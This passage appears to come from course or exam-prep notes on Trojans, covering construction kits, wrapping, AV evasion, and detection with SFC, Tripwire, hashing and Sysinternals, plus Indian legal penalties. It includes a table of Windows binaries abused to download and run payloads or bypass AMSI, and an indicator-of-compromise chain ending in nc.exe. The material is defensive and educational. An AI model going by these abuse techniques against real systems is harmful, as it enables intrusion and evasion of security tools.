| No behavioural detection | Only checks file integrity — not runtime behaviour |

> [!NOTE]
> SFC is a starting point — not a comprehensive Trojan scanner.
> It confirms Windows system file integrity. A Trojan planted in
> %APPDATA%, %TEMP%, or as a scheduled task will not be found by SFC.

---

### 5.3 Tripwire and File Integrity Monitoring

**WHAT:**
Tripwire is a File Integrity Monitoring (FIM) tool that creates
a cryptographic baseline of selected files and directories, then
alerts when any file is added, modified, or deleted.

**WHY:**
Unlike SFC which only covers Windows system files, Tripwire
monitors ANY file or directory — application binaries, config
files, web server files, database files — whatever the admin
designates as critical.

**HOW:**
Phase 1 — Baseline: Tripwire scans designated files → Computes SHA-256 hash of each file → Stores hashes in encrypted, signed database

Phase 2 — Monitoring: Tripwire re-scans at scheduled intervals (or in real time) → Recomputes hashes → Compares against baseline

Phase 3 — Alerting: Hash match → File unchanged ✅ Hash mismatch → File modified ❌ → Alert generated New file found → Unexpected addition ❌ → Alert generated File missing → Possible deletion/replacement ❌ → Alert

**Tripwire Use Cases:**

| Use Case | What It Catches |
|---|---|
| Web server monitoring | Webshell planted in web root directory |
| System binary monitoring | Trojan replacing svchost.exe, explorer.exe |
| Config file monitoring | Attacker modifying firewall rules or SSH config |
| Log file monitoring | Attacker deleting or modifying logs |
| Scheduled task monitoring | New task created by Trojan persistence |

**Other FIM Tools:**

| Tool | Platform | Notes |
|---|---|---|
| Tripwire | Cross-platform | Industry standard FIM |
| OSSEC | Cross-platform | Open-source — FIM + HIDS |
| Wazuh | Cross-platform | Open-source — OSSEC fork — widely used |
| Windows Defender ATP | Windows | Built-in FIM capability |
| AIDE | Linux | Advanced Intrusion Detection Environment |

---

### 5.4 Hash-Based Verification

**WHAT:**
Hash-based verification uses cryptographic hash functions to
generate a unique fingerprint of a file. Any change to the file —
even a single byte — produces a completely different hash value.

**WHY:**
Hashes are the universal language of file integrity. Every
threat intelligence platform, AV vendor, and security tool
shares malware indicators as file hashes. A hash uniquely
identifies a file version — regardless of its name.

**Hash Functions Used:**

| Algorithm | Output Size | Use |
|---|---|---|
| MD5 | 128-bit | Legacy — still used for file ID (NOT security) |
| SHA-1 | 160-bit | Deprecated — avoid for new implementations |
| SHA-256 | 256-bit | Current standard for file integrity |
| SHA-512 | 512-bit | High-security environments |

**Windows Commands:**
SHA-256 hash of a file (PowerShell):
Get-FileHash C:\Windows\System32\svchost.exe -Algorithm SHA256

MD5 hash (PowerShell):
Get-FileHash C:\path\to\file.exe -Algorithm MD5

CertUtil hash (built-in Windows):
certutil -hashfile C:\path\to\file.exe SHA256

**Linux Commands:**
SHA-256:
sha256sum /usr/bin/sshd

MD5:
md5sum /usr/bin/sshd

Compare against known-good hash:
echo "knownhash /usr/bin/sshd" | sha256sum --check

**Practical Use in Trojan Detection:**
Step 1: Download known-good hash from vendor website Step 2: Compute hash of file on system Step 3: Compare If match → file is legitimate ✅ If no match → file is modified or replaced ❌

> [!TIP]
> VirusTotal (virustotal.com) accepts file hash submissions.
> Submit a SHA-256 hash → 70+ AV engines check it instantly.
> Known malware hashes return immediate positive results.
> Unknown hashes return clean — but clean ≠ safe (zero-day).

---

### 5.5 Sysinternals for Trojan Detection

**WHAT:**
Sysinternals is a suite of free Windows diagnostic and
administrative tools developed by Mark Russinovich (acquired
by Microsoft in 2006). Several tools are essential for
manual Trojan detection and incident response.

**Key Sysinternals Tools:**

| Tool | Purpose | Trojan Detection Use |
|---|---|---|
| **Autoruns** | Shows ALL autostart locations | Finds ALL Trojan persistence mechanisms in one view |
| **Process Explorer** | Advanced Task Manager | Shows parent-child process relationships — spots injection |
| **Process Monitor** | Real-time file/registry/process activity | Captures Trojan activity as it happens |
| **TCPView** | Real-time network connections | Shows every active connection with owning process |
| **PsExec** | Remote execution | Used in incident response for remote investigation |
| **Sigcheck** | Verifies digital signatures | Finds unsigned or forged executables |
| **Streams** | Alternate Data Streams | Finds data hidden in NTFS ADS |
| **RootkitRevealer** | Rootkit detection | Compares kernel vs filesystem view — finds hidden files |

**Autoruns — Most Important for Exam:**

Autoruns checks every autostart location including:
- Registry Run/RunOnce keys (HKLM + HKCU)
- Scheduled Tasks
- Services
- Drivers
- Browser extensions
- Startup folders
- Winlogon entries
- AppInit DLLs
- Boot Execute entries

> [!IMPORTANT]
> Autoruns has a **VirusTotal integration** — it can submit hashes
> of every autostart entry directly to VirusTotal. Any entry flagged
> by VT is highlighted in red — instant identification of known
> malicious persistence mechanisms across all autostart locations.

**Process Explorer — Parent Process Anomalies:**
Normal: explorer.exe → Word.exe → (nothing suspicious) Trojan: Word.exe → cmd.exe → powershell.exe → nc.exe ↑ Word should NEVER spawn cmd.exe This parent-child chain = IOC Trojans delivered via Office macros always show anomalous parent-child chains — Word or Excel spawning cmd, PowerShell,wscript, or mshta is always suspicious.
---

## 📌 Extra Notes

### Framework Comparisons

**SFC vs Tripwire vs EDR — File Integrity**

| | SFC | Tripwire / FIM | EDR |
|---|---|---|---|
| Scope | Windows system files only | Any file/directory | Entire endpoint behaviour |
| Real-time? | ❌ On-demand | ✅ Scheduled / real-time | ✅ Continuous |
| Repairs files? | ✅ Yes | ❌ Alerts only | ❌ Quarantine only |
| Detects new files? | ❌ No | ✅ Yes | ✅ Yes |
| Detects registry changes? | ❌ No | ✅ If configured | ✅ Yes |
| Cost | Free (built-in) | Commercial / free (OSSEC) | Commercial |
| Best for | Quick system check | Compliance + server hardening | Active threat detection |

**Packer vs Crypter vs Obfuscator**

| | Packer | Crypter | Obfuscator |
|---|---|---|---|
| Primary action | Compresses executable | Encrypts payload | Transforms code structure |
| Stub needed? | ✅ Decompression stub | ✅ Decryption stub | ❌ No stub |
| Payload on disk? | Compressed | Encrypted | Modified plaintext |
| AV bypass strength | Moderate | Strong | Moderate |
| Runtime decryption? | ✅ Yes | ✅ Yes | ❌ No |
| Example | UPX | GuLoader | PowerShell obfuscation |

**Static vs Dynamic vs Behavioural AV Detection**

| Method | When It Runs | What It Examines | Evaded By |
|---|---|---|---|
| Signature | On file access/scan | File bytes on disk | Packing, encryption, polymorphism |
| Heuristic | On file access/scan | Code patterns | Novel/custom malware |
| Behavioural | At runtime | Process actions | Delayed execution, sandbox check |
| Sandbox | Pre-execution | Behaviour in VM | Anti-VM, sleep, user interaction check |
| ML-based | On file access | Feature vectors | Adversarial feature manipulation |

---

### Predecessor / Successor Chains

**AV Evasion Evolution:**
Simple XOR encoding (1990s) → UPX packing (1998) → Custom packers (2000s) → Runtime crypters (2005+) → Polymorphic engines (2008+) → Fileless / in-memory (2012+) → LotL / LOLBins (2014+) → AI-assisted evasion (2023+)

**File Integrity Monitoring Evolution:**
Manual hash checks (1990s) → Tripwire (1992 — original open-source) → OSSEC (2004 — open-source HIDS + FIM) → Commercial FIM (Tripwire Enterprise) → Wazuh (2015 — OSSEC fork — modern) → EDR with built-in FIM (2018+) → Cloud-native FIM (AWS CloudTrail + GuardDuty)

**Construction Kit Evolution:**
Back Orifice (1999) → SubSeven (1999) → Poison Ivy builder (2005) → Gh0st RAT builder (2008) → DarkComet builder (2008) → njRAT builder (2013) → AsyncRAT builder (2019) → MaaS platforms on Telegram (2021+) → AI-generated malware kits (2023+)


---

### 🌐 Current Landscape (2026)

**AI Tools Changing the Attack Surface:**
- **AI-generated polymorphic malware (2024–2025):** Tools like
  WormGPT and dark web LLM services generate unique malware
  variants on demand — each with different obfuscation,
  encoding, and evasion logic. Every generated sample is
  functionally identical but structurally unique — defeating
  signature AV at scale with zero effort from the attacker.
- **AMSI bypass automation (2024):** LLM-assisted tools
  automatically generate novel AMSI bypass techniques by
  mutating known bypass scripts until the AMSI hook fails
  to fire. Reduces AMSI bypass from a skill to a button click.
- **AI-assisted sandbox evasion (2025):** ML models trained
  on sandbox behaviour profiles generate timing patterns and
  user simulation that fool behaviour-based sandboxes into
  believing they are analysing benign software.

**Cloud Challenges:**
- **Cloud storage as payload hosting:** GuLoader and similar
  crypters host encrypted payloads on Google Drive, OneDrive,
  and Dropbox — using legitimate CDN domains that cannot be
  blocked by URL reputation tools without breaking productivity.
- **Cloud FIM gaps:** Traditional FIM tools do not cover
  cloud workloads natively. AWS CloudTrail + GuardDuty,
  Azure Defender for Cloud, and GCP Security Command Center
  are the cloud-native equivalents — but require explicit
  configuration for file integrity alerts.
- **Container/serverless evasion:** Trojans targeting Lambda
  functions and containerised workloads execute and disappear
  within seconds — FIM and EDR agents are not present in
  most serverless environments.

**Current CVEs (2024–2026):**
- **CVE-2024-21412 (Windows SmartScreen bypass — 2024):**
  Crafted .url and .lnk files bypass SmartScreen/MOTW
  warnings — used to deliver DarkGate RAT and Water Hydra
  Trojan. CVSS 8.1. Patched February 2024.
- **CVE-2024-38213 (MOTW bypass — 2024):**
  Files crafted to avoid Mark of the Web tag — Trojan
  delivered without security warning. Actively exploited
  before July 2024 patch.
- **CVE-2023-36884 (Office/Windows HTML RCE — 2023):**
  Zero-day exploited by Storm-0978 (RomCom RAT) to deliver
  Trojan via Office documents. No patch at time of exploitation.
  CVSS 8.3.

**Indian Legal Context:**
- **IT Act 2000 — Section 66:** Creating and deploying a
  Trojan construction kit output against another system =
  unauthorised access. Penalty: Up to 3 years + ₹5 lakh.
- **IT Act 2000 — Section 66B:** Receiving stolen data
  harvested by Trojans (credentials, files). Penalty:
  Up to 3 years + ₹1 lakh.
- **IT Act 2000 — Section 43(b):** Downloading or extracting
  data from a system using Trojan/malware = civil liability.
  Compensation up to ₹1 crore.
- **IT Act 2000 — Section 66F:** Using Trojan/malware to
  attack critical infrastructure (power grid, banking,
  defence networks) with intent to threaten national security.
  Penalty: Life imprisonment.
- **DPDPA 2023:** Data exfiltrated by Trojans from an
  organisation's systems triggers breach notification
  obligations. Penalty for breach: Up to ₹250 crore.
  Penalty for failure to notify: Up to ₹200 crore.
- **IPC Section 426:** Mischief causing damage via Trojan
  (destructive/wiper malware). Penalty: Up to 3 months
  imprisonment + fine.

---

### Terminology Traps

| Term | Trap | Clarification |
|---|---|---|
| **Packer vs Wrapper** | Often confused | Packer compresses/encrypts ONE file. Wrapper COMBINES two files (Trojan + legitimate app). |
| **Polymorphic vs Metamorphic** | Used interchangeably | Polymorphic changes encryption key/stub. Metamorphic rewrites its own code. Metamorphic is significantly harder to detect. |
| **AMSI vs AV** | Treated as the same | AMSI is a Windows API interface — it is NOT AV itself. AV engines hook into AMSI to scan script content. AMSI is the pipeline — AV is the scanner. |
| **Fileless vs In-memory** | Used interchangeably | Fileless = no file on disk. In-memory = runs in RAM. All fileless malware is in-memory but in-memory malware may still have a loader file on disk. |
| **LotL vs LOLBins** | Different terms same concept | LotL (Living off the Land) = the TECHNIQUE. LOLBins (Living off the Land Binaries) = the specific TOOLS used. |
| **SFC vs DISM** | SFC assumed sufficient | SFC repairs using local cache. If the cache itself is corrupted, DISM (Deployment Image Servicing) is needed first: `DISM /Online /Cleanup-Image /RestoreHealth` then `sfc /scannow`. |
| **Obfuscation = encryption** | Commonly confused | Obfuscation transforms code structure — no key needed, easily reversible with tools. Encryption requires a key — much stronger protection. |

---

## Abbreviations Table

| Abbreviation | Full Form | One-Line Meaning |
|---|---|---|
| AMSI | Antimalware Scan Interface | Windows API allowing AV engines to scan script content before execution |
| AV | Antivirus | Software detecting malware by signature, heuristic, or behaviour |
| C2 | Command and Control | Attacker-controlled server managing infected hosts |
| DGA | Domain Generation Algorithm | Algorithm generating random C2 domains for resilience |
| EDR | Endpoint Detection and Response | Real-time endpoint threat monitoring and response platform |
| FIM | File Integrity Monitoring | Continuous monitoring of file changes against a baseline |
| GUI | Graphical User Interface | Visual point-and-click interface — used by construction kits |
| HTA | HTML Application | Windows script host file — abused for malware execution |
| IOC | Indicator of Compromise | Artefact indicating system compromise (hash, IP, registry key) |
| ISO | ISO Disk Image | Optical disk image format — abused to bypass MOTW |
| LNK | Windows Shortcut File | Shell link file — abused to execute malicious commands |
| LotL | Living off the Land | Using legitimate OS tools for malicious purposes |
| LOLBins | Living off the Land Binaries | Specific legitimate binaries abused in LotL attacks |
| MaaS | Malware-as-a-Service | Subscription-based malware tools sold on dark web |
| MOTW | Mark of the Web | Windows security tag on internet-downloaded files |
| NSIS | Nullsoft Scriptable Install System | Legitimate installer framework — widely abused for Trojan delivery |
| NTA | Network Traffic Analysis | Monitoring network flows for anomalies and attack patterns |
| PE | Portable Executable | Windows executable file format (.exe, .dll, .sys) |
| RAT | Remote Access Trojan | Trojan providing full remote control of victim system |
| SFC | System File Checker | Built-in Windows tool scanning and repairing protected system files |
| UAC | User Account Control | Windows prompt requiring elevation for privileged operations |
| UPX | Ultimate Packer for eXecutables | Legitimate executable packer — commonly abused by malware |
| VBA | Visual Basic for Applications | Macro language in Office — primary vehicle for macro Trojans |
| VT | VirusTotal | Online multi-engine malware scanning service |
| WMI | Windows Management Instrumentation | Windows administration framework — abused for fileless persistence |
| WinSxS | Windows Side by Side | Windows Component Store — SFC source for file repairs |
| XOR | Exclusive OR | Simple bitwise operation used for basic payload encoding |

---

## 🔑 Keywords + Concept Map

**Core Keywords:**
Trojan Construction Kit · RAT Builder · MaaS · Wrapping · Binding ·
File Binder · Packer · Crypter · Obfuscation · Polymorphic ·
Metamorphic · Fileless Malware · Living off the Land · LOLBins ·
Anti-VM · Anti-Debug · Sandbox Evasion · AMSI · AMSI Bypass ·
SFC · Tripwire · FIM · Hash Verification · SHA-256 · Autoruns ·
Process Explorer · Sysinternals · GuLoader · UPX · msfvenom ·
PowerShell · certutil · MOTW · VBA Macro · ISO container ·
T1027 · T1218 · T1497 · T1562

**Concept Map:**

```
TROJAN CONSTRUCTION & EVASION
│
├── Construction
│   ├── Construction Kits ── GUI builders (DarkComet, AsyncRAT, msfvenom)
│   ├── MaaS ────────────── Subscription malware (RedLine, LockBit RaaS)
│   └── Components ──────── Builder (payload) + Server (C2 panel)
│
├── Wrapping / Delivery Concealment
│   ├── File Binding ────── Trojan + legitimate app → single .exe
│   ├── File Format Abuse ─ Word macro / PDF / ISO / LNK / OneNote
│   └── Trojanising ─────── Modify legitimate binary → inject payload
│
├── Evasion Techniques
│   ├── Obfuscation ─────── Code transformation (variable rename, dead code)
│   ├── Encoding ────────── Base64 / XOR — no key needed
│   ├── Encryption ──────── AES/RC4 stub — key needed — stronger bypass
│   ├── Packing ─────────── Compress executable (UPX, custom)
│   ├── Crypters ────────── Encrypt payload (GuLoader) — runtime/scan-time
│   ├── Polymorphic ─────── Change key+stub each infection — same behaviour
│   ├── Metamorphic ─────── Rewrite own code each infection
│   ├── Anti-Analysis ───── VM detect / debugger detect / sleep / canary
│   ├── LotL ────────────── Use OS tools (PowerShell, certutil, mshta)
│   └── Fileless ────────── Memory-only — no file on disk (AMSI target)
│
├── Countermeasures
│   ├── Host ────────────── App whitelist / AMSI / EDR / UAC / Autoruns
│   ├── Network ─────────── NGFW / SSL inspection / DNS sinkhole / NTA
│   └── Organisational ──── Awareness / patch / least privilege / IR plan
│
└── System File Verification
    ├── SFC ─────────────── Windows system files only — built-in repair
    ├── Tripwire / FIM ───── Any file — baseline + alert on change
    ├── Hash Verification ── SHA-256 comparison — manual or automated
    └── Sysinternals ─────── Autoruns / ProcExp / ProcMon / TCPView
```
---

## ⚡ Quick Reference Cheatsheet

### Evasion Technique Comparison

| Technique | Changes Signature | Changes Code | Key Needed | Hardest To Detect |
|---|---|---|---|---|
| Obfuscation | ✅ Partially | ✅ Structure only | ❌ No | ⭐⭐ |
| Encoding (Base64/XOR) | ✅ Yes | ❌ No | ❌ No | ⭐⭐ |
| Packing (UPX) | ✅ Yes | ❌ No | ❌ No | ⭐⭐ |
| Crypter (runtime) | ✅ Yes | ❌ No | ✅ Yes | ⭐⭐⭐ |
| Polymorphic | ✅ Every infection | ❌ Behaviour same | ✅ Changes | ⭐⭐⭐ |
| Metamorphic | ✅ Every infection | ✅ Yes | ❌ No | ⭐⭐⭐⭐ |
| Fileless | ✅ No file | N/A | ❌ No | ⭐⭐⭐⭐ |
| LotL | ✅ No malware file | N/A | ❌ No | ⭐⭐⭐⭐⭐ |

---

### Key LOLBins Reference

| Binary | Malicious Use | MITRE ID |
|---|---|---|
| powershell.exe | Download + execute payloads, AMSI bypass | T1059.001 |
| certutil.exe | Download files, Base64 decode | T1218 |
| mshta.exe | Execute remote HTA scripts | T1218.005 |
| regsvr32.exe | Execute remote scriptlets (Squiblydoo) | T1218.010 |
| rundll32.exe | Execute malicious DLLs | T1218.011 |
| wmic.exe | Execute commands, lateral movement | T1047 |
| msiexec.exe | Execute remote MSI payloads | T1218.007 |
| bitsadmin.exe | Download malware in background | T1197 |
| cscript/wscript | Execute malicious VBS/JS scripts | T1059.005 |

---

### SFC Commands Reference

| Command | Action |
|---|---|
| sfc /scannow | Scan + repair all protected system files |
| sfc /verifyonly | Scan only — no repair |
| sfc /scanfile=path | Scan + repair specific file |
| sfc /verifyfile=path | Verify specific file — no repair |

---

### File Integrity Monitoring Comparison

| Tool | Platform | Open Source | Real-time | Repairs |
|---|---|---|---|---|
| SFC | Windows only | ✅ Built-in | ❌ On-demand | ✅ Yes |
| Tripwire | Cross-platform | ⚠️ Partial | ✅ Yes | ❌ No |
| OSSEC | Cross-platform | ✅ Yes | ✅ Yes | ❌ No |
| Wazuh | Cross-platform | ✅ Yes | ✅ Yes | ❌ No |
| AIDE | Linux only | ✅ Yes | ❌ Scheduled | ❌ No |

---

### Hash Commands Reference

| Platform | Command | Algorithm |
|---|---|---|
| Windows (PowerShell) | Get-FileHash file.exe -Algorithm SHA256 | SHA-256 |
| Windows (CertUtil) | certutil -hashfile file.exe SHA256 | SHA-256 |
| Linux | sha256sum /path/to/file | SHA-256 |
| Linux | md5sum /path/to/file | MD5 |

---

### Key Penalty Reference

| Law | Section | Offence | Penalty |
|---|---|---|---|
| IT Act 2000 | S.66 | Deploying Trojan — unauthorised access | 3 yrs + ₹5L |
| IT Act 2000 | S.66B | Receiving stolen data via Trojan | 3 yrs + ₹1L |
| IT Act 2000 | S.43(b) | Data theft via malware | Civil ₹1 crore |
| IT Act 2000 | S.66F | Trojan on critical infrastructure | Life imprisonment |
| IPC | S.426 | Damage via destructive Trojan | 3 months + fine |
| DPDPA 2023 | — | Data breach via Trojan | Up to ₹250 crore |
| DPDPA 2023 | — | Failure to notify breach | Up to ₹200 crore |

---

## ✅ Session Revision Snapshot

**5-Bullet TL;DR:**

1. **Construction kits remove all coding skill requirements** —
   GUI-driven builders generate compiled Trojans in minutes.
   MaaS extends this further — subscription-based malware with
   full technical support on dark web markets. RedLine Stealer
   MaaS is the benchmark example — $100–$200/month, millions
   of credentials harvested.

2. **Wrapping binds Trojan + legitimate program** — victim sees
   expected behaviour (game, installer, tool) while Trojan runs
   silently. File format abuse (ISO, LNK, OneNote, HTA) became
   dominant after Microsoft blocked Office macros by default in 2022.

3. **Evasion techniques target specific detection layers** —
   packing/crypters beat signature AV, anti-VM beats sandboxes,
   fileless beats file scanners, LotL beats application whitelisting.
   Modern Trojans layer multiple techniques simultaneously.

4. **Polymorphic ≠ Metamorphic** — polymorphic changes
   encryption key and stub (behaviour unchanged). Metamorphic
   rewrites its own code (no stub needed). Metamorphic is
   significantly harder to detect — know both for exam.

5. **System file verification uses three tools** — SFC for
   Windows system files (built-in, repairs), Tripwire/FIM for
   any file (baseline + alert), Hash comparison for individual
   file verification. Sysinternals Autoruns is the single most
   useful manual Trojan detection tool.

> 🎯 **MCQ-likely:** Polymorphic vs metamorphic distinction,
> SFC command syntax, LotL definition and examples (certutil,
> mshta, regsvr32), packer vs crypter vs wrapper, AMSI purpose,
> Tripwire function, fileless malware definition, MaaS examples,
> IT Act penalties, GuLoader case, MOTW bypass delivery methods.

> 💼 **Interview-likely:** What is a construction kit and why is
> it significant? What is Living off the Land — give two examples.
> What is the difference between a packer and a crypter? How does
> fileless malware work? What does SFC do and what are its
> limitations? What is Autoruns used for?

---

## Next Session Bridge

Session 13 completed the Trojan sub-phase — covering construction,
concealment, evasion, countermeasures, and verification.
Session 14 moves to the next malware category: **Viruses and Worms**.
While Trojans rely on disguise and human execution, viruses and
worms introduce self-replication — the ability to spread without
ongoing attacker involvement. Session 14 covers virus types,
infection mechanisms, worm propagation, AV detection methods,
and evasion techniques specific to self-replicating malware.
The progression is: disguise (Trojan) → self-replicate (Virus/Worm).

---

<details>
<summary>📖 Glossary</summary>

| Term | Definition |
|---|---|
| AIDE | Advanced Intrusion Detection Environment — Linux FIM tool |
| AMSI | Antimalware Scan Interface — Windows API scanning scripts before execution |
| AMSI Bypass | Technique disabling or evading AMSI to execute malicious scripts undetected |
| Anti-Debug | Technique detecting debugger presence and halting malicious behaviour |
| Anti-VM | Technique detecting virtual machine environment and halting execution |
| Autoruns | Sysinternals tool showing every autostart location on a Windows system |
| Binding | Combining Trojan payload with legitimate executable into single file |
| certutil.exe | Windows certificate utility — LOLBin abused to download files |
| Construction Kit | GUI tool generating customised Trojan payloads without coding |
| Crypter | Tool encrypting malware payload — decrypted at runtime to evade AV |
| Dead Code Insertion | Obfuscation technique adding meaningless instructions to change signature |
| DISM | Deployment Image Servicing and Management — repairs Windows image before SFC |
| EDR | Endpoint Detection and Response — continuous endpoint threat monitoring |
| FIM | File Integrity Monitoring — alerts on file additions, modifications, deletions |
| Fileless Malware | Malware executing entirely in memory — no file written to disk |
| GuLoader | Shellcode crypter/downloader hosting payloads on cloud storage (2019–2024) |
| Heuristic Detection | AV method identifying suspicious code patterns without exact signatures |
| LOLBins | Living off the Land Binaries — legitimate OS tools abused for malicious purposes |
| LotL | Living off the Land — using legitimate OS tools to perform malicious actions |
| MaaS | Malware-as-a-Service — subscription-based malware on dark web markets |
| Metamorphic | Malware rewriting its own code each generation — no encryption stub |
| MOTW | Mark of the Web — Windows security tag on internet-downloaded files |
| msfvenom | Metasploit tool generating customised payloads for all platforms |
| NSIS | Nullsoft Scriptable Install System — legitimate installer framework widely abused |
| Obfuscation | Transforming code to increase analysis difficulty without changing function |
| OSSEC | Open-source host-based intrusion detection system with FIM capability |
| Packer | Tool compressing executable with decompression stub — changes AV signature |
| PE File | Portable Executable — Windows executable format (.exe, .dll, .sys) |
| Polymorphic | Malware changing encryption key and stub each infection — same behaviour |
| Process Explorer | Sysinternals tool showing parent-child process relationships |
| Process Monitor | Sysinternals tool capturing real-time file, registry, process events |
| RAT Builder | Construction kit specifically generating Remote Access Trojan payloads |
| regsvr32.exe | Windows COM registration tool — LOLBin used for Squiblydoo attack |
| Runtime Crypter | Crypter decrypting payload in memory — payload never on disk in plaintext |
| SFC | System File Checker — built-in Windows tool verifying and repairing system files |
| Sigcheck | Sysinternals tool verifying digital signatures of executables |
| Squiblydoo | Regsvr32-based attack executing remote scriptlets to bypass AppLocker |
| TCPView | Sysinternals tool showing all active TCP/UDP connections with owning process |
| Tripwire | File Integrity Monitoring tool — baseline + alert on any file change |
| UAC | User Account Control — Windows elevation prompt limiting privilege escalation |
| UPX | Ultimate Packer for eXecutables — legitimate packer widely abused by malware |
| VBA Macro | Visual Basic for Applications code embedded in Office documents |
| VirusTotal | Online service scanning files/hashes against 70+ AV engines |
| Wazuh | Open-source OSSEC fork — modern SIEM/HIDS/FIM platform |
| Wrapper | Tool combining Trojan with legitimate program into single executable |
| WMI | Windows Management Instrumentation — abused for fileless persistence |
| WinSxS | Windows Component Store — source files used by SFC for repairs |

</details>

---